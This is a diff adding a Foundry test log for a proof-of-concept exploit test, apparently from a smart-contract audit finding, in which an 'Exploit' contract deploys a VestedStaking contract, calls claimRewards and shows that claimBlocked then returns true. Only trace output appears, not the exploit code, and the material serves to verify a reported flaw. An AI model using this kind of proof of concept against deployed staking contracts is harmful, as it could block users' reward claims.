@@ -1,0 +1,29 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/44006-h-02-the-usdt-reward-claiming-functionality-of-vestedstaking_exp.sol:PoC_44006
+[PASS] test_exploit() (gas: 500672)
+Traces:
+  [500672] PoC_44006::test_exploit()
+    ├─ [260898] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 1303 bytes of code
+    ├─ [206845] Exploit::run()
+    │   ├─ [126938] → new VestedStaking@0x104fBc016F4bb334D775a19E8A6510109AC63E00
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 0 → 2
+    │   │   │   @ 0: 0 → 1001
+    │   │   └─ ← [Return] 413 bytes of code
+    │   ├─ [22558] VestedStaking::claimRewards()
+    │   │   ├─  storage changes:
+    │   │   │   @ 2: 0 → 1
+    │   │   └─ ← [Stop]
+    │   ├─ [510] VestedStaking::claimBlocked() [staticcall]
+    │   │   └─ ← [Return] true
+    │   ├─ emit Proof(blocked: true)
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 1
+    │   └─ ← [Stop]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 288.54µs (129.71µs CPU time)
+
+Ran 1 test suite in 5.04ms (288.54µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
